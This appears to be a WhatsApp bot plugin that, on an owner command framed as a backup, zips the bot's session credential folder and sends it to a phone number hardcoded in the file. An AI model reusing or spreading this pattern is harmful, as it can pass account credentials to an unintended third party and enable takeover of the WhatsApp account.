import fs from 'fs';
import { execSync } from 'child_process';
import fetch from 'node-fetch';

let handler = async (m, { conn }) => {
    await m.reply("Menyiapkan backup...");
    const ls = (await execSync('ls sessions')).toString().split('\n');
    const exec = await execSync(`zip -r sessions_backup.zip sessions`);

    const nomorown = "6282112080081";
    const f = {
        key: { remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' },
        message: { documentMessage: { title: 'B A C K U P - S E S S I O N - B O T' } }
    };

    // Kirim file zip ke nomor tujuan
    await conn.sendMessage(nomorown + '@s.whatsapp.net', {
        document: fs.readFileSync('./sessions_backup.zip'),
        fileName: 'Sessions Backup.zip',
        mimetype: 'application/zip'
    }, { quoted: f });

    await execSync('rm -rf sessions_backup.zip');
    await m.reply("Backup selesai!");
};

handler.help = ['session'];
handler.tags = ['owner'];
handler.command = ["session","sesi"]
handler.owner = true;

export default handler;
